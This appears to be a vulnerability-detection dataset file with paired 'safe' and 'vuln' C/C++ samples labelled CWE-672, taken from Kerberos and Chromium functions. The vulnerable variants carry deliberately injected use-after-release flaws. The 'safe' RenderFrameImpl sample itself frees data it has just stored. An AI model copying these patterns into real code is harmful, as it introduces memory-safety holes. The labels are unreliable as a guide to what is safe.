{"idx": "CWE-672-safe-1714418401097", "code": "krb5_encode_histkey(osa_princ_ent_rec* princ_ent){\n    unsigned int i;\n    krb5_error_code err = 0;\n    struct berval** ret = NULL;\n    if (princ_ent->old_key_len <= 0) return NULL;\n    ret = k5calloc(princ_ent->old_key_len + 1, sizeof(struct berval*), &err);\n    if (ret == NULL) goto cleanup;\n    for (i = 0; i < princ_ent->old_key_len; i++) {\n        if (princ_ent->old_keys[i].n_key_data <= 0) {\n            err = EINVAL;\n            goto cleanup;\n        }\n        err = encode_keys(princ_ent->old_keys[i].key_data, princ_ent->old_keys[i].n_key_data, princ_ent->admin_history_kvno, &ret[i]);\n        if (err) goto cleanup;\n    }\n    ret[princ_ent->old_key_len] = NULL;\n    cleanup:\n    if (err != 0) {\n        free_berdata(ret);\n        ret = NULL;\n    }\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "54374"}
{"idx": "CWE-672-vuln-1714418401097", "code": "krb5_encode_histkey(osa_princ_ent_rec*princ_ent){unsigned int i;krb5_error_code err=0;struct berval**ret=NULL;if(princ_ent->old_key_len <= 0)return NULL;ret=k5calloc(princ_ent->old_key_len+1, sizeof(struct berval*), &err);if(ret == NULL)goto cleanup;for(i=0;i<princ_ent->old_key_len;i++){if(princ_ent->old_keys[i].n_key_data <= 0){err=EINVAL;goto cleanup;}err=encode_keys(princ_ent->old_keys[i].key_data, princ_ent->old_keys[i].n_key_data, princ_ent->admin_history_kvno, &ret[i]);if(err)goto cleanup;}ret[princ_ent->old_key_len]=NULL;cleanup:if(err != 0){free_berdata(ret);ret=NULL;}if(ret != NULL){ret[0] = NULL;}return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "54374"}
{"idx": "CWE-672-safe-1714418416131", "code": "void RenderFrameImpl::willOpenSocketStream(blink::WebSocketStreamHandle* handle) {\n    WebSocketStreamHandleImpl* impl = static_cast<WebSocketStreamHandleImpl*>(handle);\n    impl->SetUserData(handle, new SocketStreamHandleData(routing_id_));\n    delete static_cast<SocketStreamHandleData*>(impl->GetUserData(handle));\n}", "target": 0, "source": "Big-Vul", "source_uid": "118542"}
{"idx": "CWE-672-vuln-1714418416131", "code": "void RenderFrameImpl::willOpenSocketStream(blink::WebSocketStreamHandle*handle){WebSocketStreamHandleImpl*impl=static_cast<WebSocketStreamHandleImpl*>(handle);impl->SetUserData(handle, new SocketStreamHandleData(routing_id_));SocketStreamHandleData* data = static_cast<SocketStreamHandleData*>(impl->GetUserData(handle));delete static_cast<SocketStreamHandleData*>(impl->GetUserData(handle));}", "target": 1, "source": "Big-Vul", "source_uid": "118542"}
